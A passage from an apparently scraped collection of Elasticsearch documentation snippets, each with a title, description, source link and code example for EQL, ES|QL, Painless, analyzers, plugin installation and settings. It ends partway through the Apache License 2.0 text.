https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-zoom.md#2025-04-22_snippet_3\n\nLANGUAGE: bash\nCODE:\n```\ncurl https://raw.githubusercontent.com/elastic/connectors/main/config.yml.example --output ~/connectors-config/config.yml\n```\n\n----------------------------------------\n\nTITLE: EQL Sequence Search with Expiration Event in Elasticsearch\nDESCRIPTION: Shows an EQL sequence search with an expiration event using the 'until' keyword, where matching sequences must end before a process termination event.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/eql.md#2025-04-21_snippet_11\n\nLANGUAGE: console\nCODE:\n```\nGET /my-data-stream/_eql/search\n{\n  \"query\": \"\"\"\n    sequence by process.pid with maxspan=1h\n      [ process where process.name == \"regsvr32.exe\" ]\n      [ file where stringContains(file.name, \"scrobj.dll\") ]\n    until [ process where event.type == \"termination\" ]\n  \"\"\"\n}\n```\n\n----------------------------------------\n\nTITLE: Clearing Scroll Contexts with Query Parameters in Elasticsearch\nDESCRIPTION: This snippet shows how to clear multiple scroll contexts by passing scroll_ids as comma-separated query string parameters.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/paginate-search-results.md#2025-04-21_snippet_14\n\nLANGUAGE: console\nCODE:\n```\nDELETE /_search/scroll/DXF1ZXJ5QW5kRmV0Y2gBAAAAAAAAAD4WYm9laVYtZndUQlNsdDcwakFMNjU1QQ==,DnF1ZXJ5VGhlbkZldGNoBQAAAAAAAAABFmtSWWRRWUJrU2o2ZExpSGJCVmQxYUEAAAAAAAAAAxZrUllkUVlCa1NqNmRMaUhiQlZkMWFBAAAAAAAAAAIWa1JZZFFZQmtTajZkTGlIYkJWZDFhQQAAAAAAAAAFFmtSWWRRWUJrU2o2ZExpSGJCVmQxYUEAAAAAAAAABBZrUllkUVlCa1NqNmRMaUhiQlZkMWFB\n```\n\n----------------------------------------\n\nTITLE: Creating a GCE Instance for Elasticsearch\nDESCRIPTION: Creates a Google Compute Engine instance named 'myesnode1' with the compute-rw scope, which is required for Elasticsearch discovery. The command requires specifying the zone where the instance will be deployed.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/discovery-gce-usage-long.md#2025-04-21_snippet_2\n\nLANGUAGE: sh\nCODE:\n```\ngcloud compute instances create myesnode1 \\\n       --zone <your-zone> \\\n       --scopes compute-rw\n```\n\n----------------------------------------\n\nTITLE: Calculating Square Root Using SQRT Function in ESQL\nDESCRIPTION: This snippet demonstrates the usage of the SQRT function in ESQL to calculate the square root of a numeric value. It creates a row with a double value and then applies the SQRT function to it.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/functions/sqrt.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW d = 100.0\n| EVAL s = SQRT(d)\n```\n\n----------------------------------------\n\nTITLE: Using Bitwise XOR with Def Type in Painless\nDESCRIPTION: Example demonstrating how the bitwise XOR operator works with Painless's dynamic 'def' type. Shows implicit casting between def and integer types during operations.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-operators-numeric.md#2025-04-21_snippet_34\n\nLANGUAGE: painless\nCODE:\n```\ndef x = 15 ^ 6; <1>\ndef y = x ^ 5;  <2>\n```\n\n----------------------------------------\n\nTITLE: Calculating Square Root Using SQRT Function in ESQL\nDESCRIPTION: This snippet demonstrates how to use the SQRT function in ESQL to calculate the square root of a numeric value. The example creates a row with a double value of 100.0 and then evaluates its square root, resulting in 10.0.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/sqrt.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW d = 100.0\n| EVAL s = SQRT(d)\n```\n\n----------------------------------------\n\nTITLE: Using the 'between' Function in EQL for Elasticsearch\nDESCRIPTION: The 'between' function extracts a substring between provided left and right text in a source string. It supports case-sensitive and case-insensitive matching, as well as greedy and non-greedy matching.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/eql/eql-function-ref.md#2025-04-21_snippet_1\n\nLANGUAGE: eql\nCODE:\n```\n// file.path = \"C:\\\\Windows\\\\System32\\\\cmd.exe\"\nbetween(file.path, \"System32\\\\\\\\\", \".exe\")                // returns \"cmd\"\nbetween(file.path, \"system32\\\\\\\\\", \".exe\")                // returns \"\"\nbetween(file.path, \"workspace\\\\\\\\\", \".exe\")               // returns \"\"\n\n// Make matching case-insensitive\nbetween~(file.path, \"system32\\\\\\\\\", \".exe\")               // returns \"cmd\"\n\n// Greedy matching defaults to false.\nbetween(file.path, \"\\\\\\\\\", \"\\\\\\\\\", false)                 // returns \"Windows\"\n\n// Sets greedy matching to true\nbetween(file.path, \"\\\\\\\\\", \"\\\\\\\\\", true)                  // returns \"Windows\\\\System32\"\n\n// empty source string\nbetween(\"\", \"System32\\\\\\\\\", \".exe\")                       // returns \"\"\nbetween(\"\", \"\", \"\")                                       // returns \"\"\n\n// null handling\nbetween(null, \"System32\\\\\\\\\", \".exe\")                     // returns null\n```\n\n----------------------------------------\n\nTITLE: Type Mapping Table in Markdown\nDESCRIPTION: A markdown table showing how string input types 'keyword' and 'text' both map to 'keyword' result type in ESQL function tests. This appears to be auto-generated documentation that should not be manually edited.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/types/ltrim.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n| string | result |\n| --- | --- |\n| keyword | keyword |\n| text | keyword |\n```\n\n----------------------------------------\n\nTITLE: Querying Tables with ID Columns - JavaScript\nDESCRIPTION: This example showcases the use of the `id_columns` field in a sync rule configuration for PostgreSQL. It addresses scenarios where tables lack a primary key, utilizing `id_columns` to specify unique fields for ID generation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-postgresql.md#2025-04-21_snippet_5\n\nLANGUAGE: JavaScript\nCODE:\n```\n[\n  {\n    \"tables\": [\n      \"employee\"\n    ],\n    \"query\": \"SELECT * FROM employee\",\n    \"id_columns\": [\"emp_id\"]\n  },\n  {\n    \"tables\": [\n      \"customer\"\n    ],\n    \"query\": \"SELECT * FROM customer\",\n    \"id_columns\": [\"c_id\"]\n  }\n]\n```\n\n----------------------------------------\n\nTITLE: Analyzing Text with Classic Token Filter\nDESCRIPTION: Demonstrates using the analyze API to show how the classic token filter processes text by removing possessives and modifying tokens\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-classic-tokenfilter.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nGET /_analyze\n{\n  \"tokenizer\" : \"classic\",\n  \"filter\" : [\"classic\"],\n  \"text\" : \"The 2 Q.U.I.C.K. Brown-Foxes jumped over the lazy dog's bone.\"\n}\n```\n\n----------------------------------------\n\nTITLE: Searching Documents with Ignored Fields using exists Query in Elasticsearch\nDESCRIPTION: This query uses the exists query to match all documents that have one or more fields that were ignored during indexing.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/mapping-ignored-field.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nGET _search\n{\n  \"query\": {\n    \"exists\": {\n      \"field\": \"_ignored\"\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Using TRIM Function to Remove Whitespace in ESQL\nDESCRIPTION: This example demonstrates how to use the TRIM function in ESQL to remove leading and trailing whitespace from string values. The snippet creates a row with padded text values and then uses TRIM to clean up the data.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/trim.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW message = \"   some text  \",  color = \" red \"\n| EVAL message = TRIM(message)\n| EVAL color = TRIM(color)\n```\n\n----------------------------------------\n\nTITLE: Module-Specific Entitlements Configuration in YAML\nDESCRIPTION: Example of configuring entitlements for specific modules in a plugin, granting thread management and network capabilities to different components.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/extend/creating-classic-plugins.md#2025-04-21_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\norg.elasticsearch.example-plugin:\n  - manage_threads\ncom.example.api.client:\n  - set_https_connection_properties\n  - outbound_network\n```\n\n----------------------------------------\n\nTITLE: Implementing Custom Polish Analyzer in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to create a custom analyzer called 'rebuilt_stempel' that reimplements the functionality of the built-in Polish analyzer. The analyzer uses a standard tokenizer followed by lowercase filter, Polish stop words filter, and Polish stemming filter. This approach allows for more flexibility in customizing the analyzer configuration.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/_reimplementing_and_extending_the_analyzers_2.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT /stempel_example\n{\n  \"settings\": {\n    \"analysis\": {\n      \"analyzer\": {\n        \"rebuilt_stempel\": {\n          \"tokenizer\":  \"standard\",\n          \"filter\": [\n            \"lowercase\",\n            \"polish_stop\",\n            \"polish_stem\"\n          ]\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining Categorization Analyzer in Elasticsearch\nDESCRIPTION: Example of specifying a categorization analyzer object with character filters, tokenizer, and token filters for the categorize text aggregation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-categorize-text-aggregation.md#2025-04-21_snippet_0\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"categorization_analyzer\": {\n    \"char_filter\": [\"pattern_replace_filter\"],\n    \"tokenizer\": \"ml_standard\",\n    \"filter\": [\"lowercase\"]\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: GROK Pattern with Escaped Characters in ESQL\nDESCRIPTION: Shows how to handle special regex characters in GROK patterns using single quotes and escaped backslashes.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/esql-process-data-with-dissect-grok.md#2025-04-21_snippet_10\n\nLANGUAGE: esql\nCODE:\n```\nROW a = \"1.2.3.4 [2023-01-23T12:15:00.000Z] Connected\"\n| GROK a \"%{IP:ip} \\\\[%{TIMESTAMP_ISO8601:@timestamp}\\\\] %{GREEDYDATA:status}\"\n```\n\n----------------------------------------\n\nTITLE: Boolean OR with Boolean Type\nDESCRIPTION: Demonstrates boolean OR operations using explicit boolean type declarations and logical OR combinations\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-operators-boolean.md#2025-04-21_snippet_33\n\nLANGUAGE: painless\nCODE:\n```\nboolean x = false;     \nboolean y = x || true; \ny = false;             \ny = y || x;            \n```\n\n----------------------------------------\n\nTITLE: Executing a Regexp Query in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to use the regexp query in Elasticsearch to find documents where the `user.id` field contains terms matching a specified regular expression. It configures the query with options for case-insensitive matching and maximum determinized states.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-regexp-query.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"query\": {\n    \"regexp\": {\n      \"user.id\": {\n        \"value\": \"k.*y\",\n        \"flags\": \"ALL\",\n        \"case_insensitive\": true,\n        \"max_determinized_states\": 10000,\n        \"rewrite\": \"constant_score_blended\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining Deprecated Routes with Version Information\nDESCRIPTION: Example of declaring REST API routes with deprecation information. This allows the server to handle deprecated paths properly based on the requested API version.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/REST_API_COMPATIBILITY.md#2025-04-21_snippet_6\n\nLANGUAGE: java\nCODE:\n```\nRoute.builder(GET, \"_mypath/{foo}/{bar}\").deprecated(MY_DEPRECATION_MESSAGE, RestApiVersion.V_7).build(),\n```\n\n----------------------------------------\n\nTITLE: SQL Query for FIRST Aggregation\nDESCRIPTION: This SQL query selects the first value of the keyword field from the test table.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/sql/src/test/resources/org/elasticsearch/xpack/sql/planner/querytranslator_tests.txt#2025-04-21_snippet_22\n\nLANGUAGE: SQL\nCODE:\n```\nSELECT FIRST(keyword) FROM test;\n```\n\n----------------------------------------\n\nTITLE: Accessing _source Document in Elasticsearch Script Fields\nDESCRIPTION: This example shows how to access the actual _source document within script fields and extract specific elements from it using params['_source']. This method allows returning custom values from the source document.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/retrieve-selected-fields.md#2025-04-21_snippet_14\n\nLANGUAGE: json\nCODE:\n```\nGET /_search\n{\n  \"query\": {\n    \"match_all\": {}\n  },\n  \"script_fields\": {\n    \"test1\": {\n      \"script\": \"params['_source']['message']\"\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Using the Limit Token Filter with Analyze API in Elasticsearch\nDESCRIPTION: Example of using the limit token filter with the analyze API to keep only the first two tokens from the input text. The filter is configured with a max_token_count of 2.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-limit-token-count-tokenfilter.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nGET _analyze\n{\n  \"tokenizer\": \"standard\",\n    \"filter\": [\n    {\n      \"type\": \"limit\",\n      \"max_token_count\": 2\n    }\n  ],\n  \"text\": \"quick fox jumps over lazy dog\"\n}\n```\n\n----------------------------------------\n\nTITLE: Defining LongStream Interface in Painless - Java\nDESCRIPTION: Details the LongStream interface, which processes sequences of long values. It supports a vast range of operations such as mapping, collecting, and reducing specifically for long types.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.util.stream.txt#2025-04-21_snippet_6\n\nLANGUAGE: Java\nCODE:\n```\nclass java.util.stream.LongStream {\n  boolean allMatch(LongPredicate)\n  boolean anyMatch(LongPredicate)\n  DoubleStream asDoubleStream()\n  OptionalDouble average()\n  Stream boxed()\n  LongStream.Builder builder()\n  def collect(Supplier,ObjLongConsumer,BiConsumer)\n  LongStream concat(LongStream,LongStream)\n  long count()\n  LongStream distinct()\n  LongStream empty()\n  LongStream filter(LongPredicate)\n  OptionalLong findAny()\n  OptionalLong findFirst()\n  LongStream flatMap(LongFunction)\n  void forEach(LongConsumer)\n  void forEachOrdered(LongConsumer)\n  PrimitiveIterator.OfLong iterator()\n  LongStream limit(long)\n  LongStream map(LongUnaryOperator)\n  DoubleStream mapToDouble(LongToDoubleFunction)\n  IntStream mapToInt(LongToIntFunction)\n  Stream mapToObj(LongFunction)\n  OptionalLong max()\n  OptionalLong min()\n  boolean noneMatch(LongPredicate)\n  LongStream of(long[])\n  LongStream peek(LongConsumer)\n  LongStream range(long,long)\n  LongStream rangeClosed(long,long)\n  OptionalLong reduce(LongBinaryOperator)\n  long reduce(long,LongBinaryOperator)\n  LongStream sequential()\n  LongStream skip(long)\n  LongStream sorted()\n  Spliterator.OfLong spliterator()\n  long sum()\n  LongSummaryStatistics summaryStatistics()\n  long[] toArray()\n}\n```\n\n----------------------------------------\n\nTITLE: Removing the EC2 Discovery Plugin from Elasticsearch\nDESCRIPTION: Command to remove the EC2 Discovery plugin from an Elasticsearch node. The node must be stopped before the plugin can be removed.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/discovery-ec2.md#2025-04-21_snippet_1\n\nLANGUAGE: sh\nCODE:\n```\nsudo bin/elasticsearch-plugin remove discovery-ec2\n```\n\n----------------------------------------\n\nTITLE: Installing ICU Analysis Plugin in Elasticsearch\nDESCRIPTION: Command to install the ICU analysis plugin using the Elasticsearch plugin manager. This must be installed on every node in the cluster, and each node must be restarted after installation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/analysis-icu.md#2025-04-21_snippet_0\n\nLANGUAGE: sh\nCODE:\n```\nsudo bin/elasticsearch-plugin install analysis-icu\n```\n\n----------------------------------------\n\nTITLE: Defining Max Lookups Per Request for Enrich Coordinator Proxy in Elasticsearch YAML\nDESCRIPTION: Sets the maximum number of searches to include in a multi-search request when enriching documents. The default value is 128.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/enrich-settings.md#2025-04-21_snippet_2\n\nLANGUAGE: yaml\nCODE:\n```\nenrich.coordinator_proxy.max_lookups_per_request: 128\n```\n\n----------------------------------------\n\nTITLE: Linked HashMap Implementation in Java\nDESCRIPTION: This snippet defines the LinkedHashMap class, which maintains a linked list of the entries in the map, which preserves the insertion order of the entries.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.util.txt#2025-04-21_snippet_24\n\nLANGUAGE: Java\nCODE:\n```\nclass java.util.LinkedHashMap {\n  ()\n  (Map)\n}\n```\n\n----------------------------------------\n\nTITLE: Example Reindex Status Response in Elasticsearch\nDESCRIPTION: This snippet shows a sample response from the reindex status API. It provides details about the reindexing progress, including start time, completion status, total indices, and progress metrics for individual indices being reindexed.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/reindex-data-stream.md#2025-04-21_snippet_2\n\nLANGUAGE: console-result\nCODE:\n```\n{\n  \"start_time_millis\": 1737676174349,\n  \"complete\": false,\n  \"total_indices_in_data_stream\": 4,\n  \"total_indices_requiring_upgrade\": 3,\n  \"successes\": 0,\n  \"in_progress\": [\n    {\n      \"index\": \".ds-my-data-stream-2025.01.23-000001\",\n      \"total_doc_count\": 10000000,\n      \"reindexed_doc_count\": 999999\n    }\n  ],\n  \"pending\": 2,\n  \"errors\": []\n}\n```\n\n----------------------------------------\n\nTITLE: Creating an Index with Multi-field Mapping in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to create an index with a multi-field mapping for the 'city' field. The field is indexed as both 'text' for full-text search and 'keyword' for sorting and aggregations.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/multi-fields.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT my-index-000001\n{\n  \"mappings\": {\n    \"properties\": {\n      \"city\": {\n        \"type\": \"text\",\n        \"fields\": {\n          \"raw\": {\n            \"type\":  \"keyword\"\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Missing Date Components Defaults\nDESCRIPTION: This shows the default values that Elasticsearch uses when date components are missing in range queries or date range aggregations. This behaviour applies when no date format is specified.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-range-query.md#2025-04-21_snippet_3\n\nLANGUAGE: text\nCODE:\n```\nMONTH_OF_YEAR:    01\nDAY_OF_MONTH:     01\nHOUR_OF_DAY:      23\nMINUTE_OF_HOUR:   59\nSECOND_OF_MINUTE: 59\nNANO_OF_SECOND:   999_999_999\n```\n\n----------------------------------------\n\nTITLE: Combining Rule Retriever with RRF\nDESCRIPTION: Advanced example showing how to combine rule retriever with reciprocal rank fusion (RRF) for complex search scenarios\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/retrievers.md#2025-04-21_snippet_13\n\nLANGUAGE: console\nCODE:\n```\nGET movies/_search\n{\n  \"retriever\": {\n    \"rule\": {\n      \"match_criteria\": {\n        \"query_string\": \"harry potter\"\n      },\n      \"ruleset_ids\": [\n        \"my-ruleset\"\n      ],\n      \"retriever\": {\n        \"rrf\": {\n          \"retrievers\": [\n            {\n              \"standard\": {\n                \"query\": {\n                  \"query_string\": {\n                    \"query\": \"sorcerer's stone\"\n                  }\n                }\n              }\n            },\n            {\n              \"standard\": {\n                \"query\": {\n                  \"query_string\": {\n                    \"query\": \"chamber of secrets\"\n                  }\n                }\n              }\n            }\n          ]\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Pass-through Object Conflict Resolution Example\nDESCRIPTION: Shows how to handle naming conflicts between multiple pass-through objects using priority settings.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/passthrough.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPUT my-index-000002\n{\n  \"mappings\": {\n    \"properties\": {\n      \"attributes\": {\n        \"type\": \"passthrough\",\n        \"priority\": 10,\n        \"properties\": {\n          \"id\": {\n            \"type\": \"keyword\"\n          }\n        }\n      },\n      \"resource.attributes\": {\n        \"type\": \"passthrough\",\n        \"priority\": 20,\n        \"properties\": {\n          \"id\": {\n            \"type\": \"keyword\"\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Apache License 2.0 Boilerplate Notice Template\nDESCRIPTION: Standard boilerplate text template for applying the Apache License 2.0 to a work. Fields in brackets should be replaced with actual project information.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/ingest-attachment/licenses/tika-langdetect-LICENSE.txt#2025-04-21_snippet_0\n\nLANGUAGE: text\nCODE:\n```\nCopyright [yyyy] [name of copyright owner]\n\nLicensed under the Apache License, Version 2.0 (the \"License\");\nyou may not use this file except in compliance with the License.\nYou may obtain a copy of the License at\n```\n\n----------------------------------------\n\nTITLE: Configuring Classic Tokenizer with Custom Settings\nDESCRIPTION: Example showing how to configure a classic tokenizer with a custom max_token_length setting and create a custom analyzer using it.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-classic-tokenizer.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPUT my-index-000001\n{\n  \"settings\": {\n    \"analysis\": {\n      \"analyzer\": {\n        \"my_analyzer\": {\n          \"tokenizer\": \"my_tokenizer\"\n        }\n      },\n      \"tokenizer\": {\n        \"my_tokenizer\": {\n          \"type\": \"classic\",\n          \"max_token_length\": 5\n        }\n      }\n    }\n  }\n}\n\nPOST my-index-000001/_analyze\n{\n  \"analyzer\": \"my_analyzer\",\n  \"text\": \"The 2 QUICK Brown-Foxes jumped over the lazy dog's bone.\"\n}\n```\n\nLANGUAGE: text\nCODE:\n```\n[ The, 2, QUICK, Brown, Foxes, jumpe, d, over, the, lazy, dog's, bone ]\n```\n\n----------------------------------------\n\nTITLE: Escaping Event Categories in EQL\nDESCRIPTION: Shows how to escape event categories that contain special characters, spaces, or start with numerals using double quotes or triple double quotes.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/eql/eql-syntax.md#2025-04-21_snippet_3\n\nLANGUAGE: eql\nCODE:\n```\n\".my.event.category\"\n\"my-event-category\"\n\"my event category\"\n\"6eventcategory\"\n\n\"\"\".my.event.category\"\"\"\n\"\"\"my-event-category\"\"\"\n\"\"\"my event category\"\"\"\n\"\"\"6eventcategory\"\"\"\n```\n\n----------------------------------------\n\nTITLE: Displaying Apache License 2.0 Text\nDESCRIPTION: This snippet contains the full text of the Apache License Version 2.0, including definitions, terms, and conditions for software use and distribution. It covers copyright and patent licenses, redistribution rules, and liability limitations.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/text-structure/licenses/super-csv-LICENSE.txt#2025-04-21_snippet_0\n\nLANGUAGE: plaintext\nCODE:\n```\n/*\n *                                 Apache License\n *                           Version 2.0, January 2004\n *                        http://www.apache.org/licenses/\n *\n *   TERMS AND CONDITIONS FOR USE, REPRODUCTION, AND DISTRIBUTION\n *\n *   1. Definitions.\n *\n *      \"License\" shall mean the terms and conditions for use, reproduction,\n *      and distribution as defined by Sections 1 through 9 of this document.\n *\n *      \"Licensor\" shall mean the copyright owner or entity authorized by\n *      the copyright owner that is granting the License.\n *\n *      \"Legal Entity\" shall mean the union of the acting entity and all\n *      other entities that control, are controlled by, or are under common\n *      control with that entity. For the purposes of this definition,\n *      \"control\" means (i) the power, direct or indirect, to cause the\n *      direction or management of such entity, whether by contract or\n *      otherwise, or (ii) ownership of fifty percent (50%) or more of the\n *      outstanding shares, or (iii) beneficial ownership of such entity.\n *\n *      \"You\" (or \"Your\") shall mean an individual or Legal Entity\n *      exercising permissions granted by this License.\n *\n *      \"Source\" form shall mean the preferred form for making modifications,\n *      including but not limited to software source code, documentation\n *      source, and configuration files.\n *\n *      \"Object\" form shall mean any form resulting from mechanical\n *      transformation or translation of a Source form, including but\n *      not limited to compiled object code, generated documentation,\n *      and conversions to other media types.\n *\n *      \"Work\" shall mean the work of authorship, whether in Source or\n *      Object form, made available under the License, as indicated by a\n *      copyright notice that is included in or attached to the work\n *      (an example is provided in the Appendix below).\n *\n *      \"Derivative Works\" shall mean any work, whether in Source or Object\n *      form, that is based on (or derived from) the Work and for which the\n *      editorial revisions, annotations, elaborations, or other modifications\n *      represent, as a whole, an original work of authorship. For the purposes\n *      of this License, Derivative Works shall not include works that remain\n *      separable from, or merely link (or bind by name) to the interfaces of,\n *      the Work and Derivative Works thereof.\n *\n *      \"Contribution\" shall mean any work of authorship, including\n *      the original version of the Work and any modifications or additions\n *      to that Work or Derivative Works thereof, that is intentionally\n *      submitted to Licensor for inclusion in the Work by the copyright owner\n *      or by an individual or Legal Entity authorized to submit on behalf of\n *      the copyright owner. For the purposes of this definition, \"submitted\"\n *      means any form of electronic, verbal, or written communication sent\n *      to the Licensor or its representatives, including but not limited to\n *      communication on electronic mailing lists, source code control systems,\n *      and issue tracking systems that are managed by, or on behalf of, the\n *      Licensor for the purpose of discussing and improving the Work, but\n *      excluding communication that is conspicuously marked or otherwise\n *      designated in writing by the copyright owner as \"Not a Contribution.\"\n *\n *      \"Contributor\" shall mean Licensor and any individual or Legal Entity\n *      on behalf of whom a Contribution has been received by Licensor and\n *      subsequently incorporated within the Work.\n *\n *   2. Grant of Copyright License. Subject to the terms and conditions of\n *      this License, each Contributor hereby grants to You a perpetual,\n *      worldwide, non-exclusive, no-charge, royalty-free, irrevocable\n *      copyright license to reproduce, prepare Derivative Works of,\n *      publicly display, publicly perform, sublicense, and distribute the\n *      Work and such Derivative Works in Source or Object form.\n *\n *   3. Grant of Patent License. Subject to the terms and conditions of\n *      this License, each Contributor hereby grants to You a perpetual,\n *      worldwide, non-exclusive, no-charge, royalty-free, irrevocable\n *      (except as stated in this section) patent license to make, have made,\n *      use, offer to sell, sell, import, and otherwise transfer the Work,\n *      where such license applies only to those patent claims licensable\n *      by such Contributor that are necessarily infringed by their\n *      Contribution(s) alone or by combination of their Contribution(s)\n *      with the Work to which such Contribution(s) was submitted. If You\n *      institute patent litigation against any entity (including a\n *      cross-claim or counterclaim in a lawsuit) alleging that the Work\n *      or a Contribution incorporated within the Work constitutes direct\n *      or contributory patent infringement, then any patent licenses\n *      granted to You under this License for that Work shall terminate\n *      as of the date such litigation is filed.\n *\n *   4. Redistribution. You may reproduce and distribute copies of the\n *      Work or Derivative Works thereof in any medium, with or without\n *      modifications, and in Source or Object form, provided that You\n *      meet the following conditions:\n *\n *      (a) You must give any other recipients of the Work or\n *          Derivative Works a copy of this License; and\n *\n *      (b) You must cause any modified files to carry prominent notices\n *          stating that You changed the files; and\n *\n *      (c) You must retain, in the Source form of any Derivative Works\n *          that You distribute, all copyright, patent, trademark, and\n *          attribution notices from the Source form of the Work,\n *          excluding those notices that do not pertain to any part of\n *          the Derivative Works; and\n *\n *      (d) If the Work includes a \"NOTICE\" text file as part of its\n *          distribution, then any Derivative Works that You distribute must\n *          include a readable copy of the attribution notices contained\n *          within such NOTICE file, excluding those notices that do not\n *          pertain to any part of the Derivative Works, in at least one\n *          of the following places: within a NOTICE text file distributed\n *          as part of the Derivative Works; within the Source form or\n *          documentation, if provided along with the Derivative Works; or,\n *          within a display generated by the Derivative Works, if and\n *          wherever such third-party notices normally appear. The contents\n *          of the NOTICE file are for informational purposes only and\n *          do not modify the License. You may add Your own attribution\n *          notices within Derivative Works that You distribute, alongside\n *          or as an addendum to the NOTICE text from the Work, provided\n *          that such additional attribution notices cannot be construed\n *          as modifying the License.\n *\n *      You may add Your own copyright statement to Your modifications and\n *      may provide additional or different license terms and conditions\n *      for use, reproduction, or distribution of Your modifications, or\n *      for any such Derivative Works as a whole, provided Your use,\n *      reproduction, and distribution of the Work otherwise complies with\n *      the conditions stated in this License.\n *\n *   5. Submission of Contributions. Unless You explicitly state otherwise,\n *      any Contribution intentionally submitted for inclusion in the Work\n *      by You to the Licensor shall be under the terms and conditions of\n *      this License, without any additional terms or conditions.\n *      Notwithstanding the above, nothing herein shall supersede or modify\n *      the terms of any separate license agreement you may have executed\n *      with Licensor regarding such Contributions.\n *\n *   6. Trademarks. This License does not grant permission to use the trade\n *      names, trademarks, service marks, or product names of the Licensor,\n *      except as required for reasonable and customary use in describing the\n *      origin of the Work and reproducing the content of the NOTICE file.\n *\n *   7. Disclaimer of Warranty. Unless required by applicable law or\n *      agreed to in writing, Licensor provides the Work (and each\n *      Contributor provides its Contributions) on an \"AS IS\" BASIS,\n *      WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or\n *      implied, including, without limitation, any warranties or conditions\n *      of TITLE, NON-INFRINGEMENT, MERCHANTABILITY, or FITNESS FOR A\n *      PARTICULAR PURPOSE. You are solely responsible for determining the\n *      appropriateness of using or redistributing the Work and assume any\n *      risks associated with Your exercise of permissions under this License.\n *\n *   8. Limitation of Liability. In no event and under no legal theory,\n *      whether in tort (including negligence), contract, or otherwise,\n *      unless required by applicable law (such as deliberate and grossly\n *      negligent acts) or agreed to in writing, shall any Contributor be\n *      liable to You for damages, including any direct, indirect, special,\n *      incidental, or consequential damages of any character arising as a\n *      result of this License or out of the 